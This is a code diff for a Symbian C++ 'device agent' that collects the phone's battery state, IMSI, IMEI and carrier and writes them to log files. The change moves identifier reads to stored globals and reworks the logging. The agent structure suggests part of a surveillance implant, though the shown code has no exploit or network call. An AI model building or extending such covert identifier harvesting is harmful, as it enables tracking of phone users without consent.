@@ -63,14 +63,13 @@ void CAgentDevice::ConstructL(const TDesC8& params)
 	BaseConstructL(params);
 	__FLOG_OPEN("HT", "Agent_Device.txt");
 	__FLOG(_L("-------------"));
-		
 	iPhone = CPhone::NewL();  
 	}
 
 void CAgentDevice::StartAgentCmdL()
 	{
 	__FLOG(_L("StartAgentCmdL()"));
-	CreateLogL(LOGTYPE_DEVICE);
+	//CreateLogL(LOGTYPE_DEVICE);
 	RBuf8 buf(GetInfoBufferL());
 	buf.CleanupClosePushL();
 	if (buf.Length() > 0)
@@ -79,18 +78,28 @@ void CAgentDevice::StartAgentCmdL()
 		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
 		if(value)
 			{
-			// dump the buffer to the file log. 
-			AppendLogL(buf);
+			// dump the buffer to the file log.
+			CLogFile* logFile = CLogFile::NewLC(iFs);
+			logFile->CreateLogL(LOGTYPE_DEVICE);
+			logFile->AppendLogL(buf);
+			logFile->CloseLogL();
+		    CleanupStack::PopAndDestroy(logFile);
+			//AppendLogL(buf);
 			}
 		}
 	CleanupStack::PopAndDestroy(&buf);
-	CloseLogL();
+	//CloseLogL();
 	}
 
 void CAgentDevice::StopAgentCmdL()
 	{
 	__FLOG(_L("StopAgentCmdL()"));
 	iPhone->Cancel();		
+	}
+
+void CAgentDevice::CycleAgentCmdL()
+	{
+	//nothing to be done, this is not an appending agent
 	}
 
 
@@ -127,6 +136,8 @@ HBufC8* CAgentDevice::GetInfoBufferL()
 	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
 	 
 	// Battery
+	//TODO: try PS keys: 
+	//http://www.developer.nokia.com/Community/Wiki/CS000902_-_Observing_battery_state_with_properties
 	_LIT(KFormatBattery,"Battery: %u%%  (on AC line)\n");
 	_LIT(KFormatBattery2,"Battery: %u%%  \n");
 	TUint chargeLevel=0;
@@ -201,21 +212,33 @@ HBufC8* CAgentDevice::GetInfoBufferL()
 	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
 		
 	// IMSI
+	/*
 	TBuf<CTelephony::KIMSISize> imsi;
 	iPhone->GetImsiSync(imsi);   
 	_LIT(KFormatImsi,"IMSI: %S \n");
 	buf.Zero();
 	buf.Format(KFormatImsi,&imsi);
 	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
-	
+	*/
+	_LIT(KFormatImsi,"IMSI: %S \n");
+	buf.Zero();
+	buf.Format(KFormatImsi,&iGlobalImsi);
+	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
+		
 	// IMEI
+	/*
 	TBuf<CTelephony::KPhoneSerialNumberSize> imei;
 	iPhone->GetImeiSync(imei);  
 	_LIT(KFormatImei,"IMEI: %S \n");
 	buf.Zero();
 	buf.Format(KFormatImei,&imei);
 	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
-
+	 */
+	_LIT(KFormatImei,"IMEI: %S \n");
+	buf.Zero();
+	buf.Format(KFormatImei,&iGlobalImei);
+	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
+		
 	// Carrier
 	TBuf<CTelephony::KNetworkLongNameSize> carrier;
 	iPhone->GetOperatorNameSync(carrier); 
